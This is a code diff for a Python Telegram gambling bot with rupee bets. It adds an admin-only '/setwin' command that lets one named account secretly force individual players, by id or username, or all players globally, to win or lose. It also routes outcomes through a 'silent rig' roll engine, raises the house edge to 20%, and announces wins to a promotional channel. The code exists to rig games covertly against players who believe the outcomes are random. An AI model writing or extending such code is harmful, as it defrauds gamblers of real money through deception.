@@ -8,9 +8,12 @@ from helpers import ensure_user
 from pvp_state import create_challenge, get_challenge, remove_challenge
 
 RIG_GROUP = "@thecassinorigpvt"
-HOUSE_EDGE = 0.20  # 5% house edge
+WINS_CHANNEL = "@thecassinowins"
+HOUSE_EDGE = 0.20  # 20% house edge
 PVP_TIMEOUT = 120  # 120 seconds auto-cancel
-FORCE_RIG_USERS = {}  # {user_id: "win" | "lose"}
+
+FORCE_RIG_USERS = {}  # {user_id_or_username: "win" | "lose"}
+GLOBAL_RIG = None  # Holds global default ("win", "lose", or None)
 
 # Supported emoji shortcuts
 GAME_EMOJIS = {
@@ -21,6 +24,15 @@ GAME_EMOJIS = {
     "football": "⚽",
     "slots": "🎰"
 }
+
+# Helper to resolve user rig status (Individual priority > Global default)
+def get_user_rig_status(user_id, username=None):
+    if user_id in FORCE_RIG_USERS:
+        return FORCE_RIG_USERS[user_id]
+    if username and username.lower() in FORCE_RIG_USERS:
+        return FORCE_RIG_USERS[username.lower()]
+    return GLOBAL_RIG
+
 
 # --- 1. SILENT RIG ROLL ENGINE ---
 def roll_rigged_emoji(chat_id, emoji, target_value=None):
@@ -50,25 +62,54 @@ def roll_rigged_emoji(chat_id, emoji, target_value=None):
 # --- 2. ADMIN RIG CONTROL COMMAND ---
 @bot.message_handler(commands=["setwin"])
 def cmd_setwin(message):
+    global GLOBAL_RIG
+
     if (message.from_user.username or "").lower() != "mrpuppyx":
         return
 
     args = message.text.split()
-    if len(args) < 3:
-        bot.reply_to(message, "⚠️ Usage: <code>/setwin &lt;user_id&gt; &lt;win|lose|reset&gt;</code>", parse_mode="HTML")
+    target = None
+    action = None
+
+    # Scenario A: Replying to a user message (/setwin win)
+    if message.reply_to_message:
+        if len(args) >= 2:
+            target = message.reply_to_message.from_user.id
+            action = args[1].lower()
+    # Scenario B: Target specified explicitly (/setwin @username win OR /setwin 123456 lose OR /setwin all lose)
+    elif len(args) >= 3:
+        target = args[1].lower()
+        action = args[2].lower()
+
+    if not target or not action:
+        bot.reply_to(
+            message,
+            "⚠️ Usage:\n"
+            "• <code>/setwin &lt;@username|id|all&gt; &lt;win|lose|reset&gt;</code>\n"
+            "• Reply to a message: <code>/setwin &lt;win|lose|reset&gt;</code>",
+            parse_mode="HTML"
+        )
         return
 
-    try:
-        target_id = int(args[1])
-        action = args[2].lower()
+    # Handle Global "all" setting
+    if str(target) == "all":
         if action in ["win", "lose"]:
-            FORCE_RIG_USERS[target_id] = action
-            bot.reply_to(message, f"✅ User <code>{target_id}</code> rig set to <b>{action.upper()}</b>", parse_mode="HTML")
+            GLOBAL_RIG = action
+            bot.reply_to(message, f"🌐 <b>Global default rig set to:</b> <b>{action.upper()}</b> for all players!", parse_mode="HTML")
         else:
-            FORCE_RIG_USERS.pop(target_id, None)
-            bot.reply_to(message, f"🔄 Rig reset for user <code>{target_id}</code>.", parse_mode="HTML")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}")
+            GLOBAL_RIG = None
+            bot.reply_to(message, "🔄 <b>Global default rig reset to normal.</b>", parse_mode="HTML")
+        return
+
+    # Parse numerical ID vs Username string
+    key = int(target) if str(target).isdigit() else str(target)
+
+    if action in ["win", "lose"]:
+        FORCE_RIG_USERS[key] = action
+        bot.reply_to(message, f"✅ Rig for <code>{key}</code> set to <b>{action.upper()}</b>", parse_mode="HTML")
+    else:
+        FORCE_RIG_USERS.pop(key, None)
+        bot.reply_to(message, f"🔄 Rig reset for <code>{key}</code>.", parse_mode="HTML")
 
 
 # --- 3. UNIFIED COMMAND PARSER FOR EMOJI GAMES & PVP ---
@@ -81,7 +122,6 @@ def handle_game_init(message):
     args = message.text.split()
     cmd = args[0].replace("/", "").lower()
 
-    # Defaults
     game_type = "dice" if cmd in ["pvp", "duel"] else cmd
     emoji = GAME_EMOJIS.get(game_type, "🎲")
 
@@ -101,7 +141,6 @@ def handle_game_init(message):
         if len(args) >= 2:
             amount_str = args[1]
 
-    # Parse rounds & target opponent
     for arg in args[2:]:
         if arg.isdigit():
             rounds = int(arg)
@@ -131,7 +170,6 @@ def handle_game_init(message):
     adjust_balance(sender_id, -amount)
     challenge_id = create_challenge(sender_id, amount, game_type)
 
-    # Save extra metadata in pvp state
     challenge = get_challenge(challenge_id)
     challenge.update({
         "challenger_username": sender_user,
@@ -166,12 +204,13 @@ def handle_game_init(message):
 # --- 4. VS BOT ENGINE ---
 def run_bot_match(message, emoji, bet, rounds):
     user_id = message.from_user.id
+    username_raw = message.from_user.username
     chat_id = message.chat.id
-    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
+    username = f"@{username_raw}" if username_raw else message.from_user.first_name
 
     adjust_balance(user_id, -bet)
     user_wins, bot_wins = 0, 0
-    rig_status = FORCE_RIG_USERS.get(user_id)
+    rig_status = get_user_rig_status(user_id, username_raw)
 
     bot.send_message(chat_id, f"🎮 <b>Match vs Bot Started ({rounds} Rounds, ₹{bet:.2f} Bet)</b>", parse_mode="HTML")
 
@@ -228,7 +267,6 @@ def handle_pvp_callbacks(call):
     caller_id = call.from_user.id
     caller_user = f"@{call.from_user.username}" if call.from_user.username else call.from_user.first_name
 
-    # Cancel action
     if action == "pvp_can":
         if caller_id != challenge["challenger_id"] and caller_user.lower() != challenge.get("opponent_username", "").lower():
             bot.answer_callback_query(call.id, "❌ Only involved players can cancel!", show_alert=True)
@@ -239,7 +277,6 @@ def handle_pvp_callbacks(call):
         bot.edit_message_text("❌ <b>PVP Match Cancelled. Bet refunded.</b>", challenge["chat_id"], call.message.message_id, parse_mode="HTML")
         return
 
-    # Accept action
     if action == "pvp_acc":
         if caller_user.lower() != challenge.get("opponent_username", "").lower():
             bot.answer_callback_query(call.id, "❌ Only the challenged player can accept!", show_alert=True)
@@ -324,9 +361,23 @@ def run_pvp_match(challenge_id):
         + "\n".join(summary)
         + f"\n\n👑 <b>Winner:</b> {winner}\n"
         f"💀 <b>Loser:</b> {loser}\n"
-        f"💵 <b>Prize Payout:</b> ₹{prize:.2f} (5% House Edge deducted)"
+        f"💵 <b>Prize Payout:</b> ₹{prize:.2f} (20% House Edge deducted)"
     )
     bot.send_message(chat_id, summary_msg, parse_mode="HTML")
+
+    # --- WINS CHANNEL ANNOUNCEMENT ---
+    try:
+        wins_channel_msg = (
+            f"⚡ <b>BIG PVP WIN!</b> {emoji}\n\n"
+            f"👑 <b>Winner:</b> {winner}\n"
+            f"💀 <b>Defeated:</b> {loser}\n"
+            f"💰 <b>Total Prize:</b> ₹{prize:.2f}\n"
+            f"🎮 <b>Game Mode:</b> {c['rounds']} Round(s) {emoji}"
+        )
+        bot.send_message(WINS_CHANNEL, wins_channel_msg, parse_mode="HTML")
+    except Exception as err:
+        print(f"⚠️ Failed to post to wins channel: {err}")
+
     remove_challenge(challenge_id)
 
 
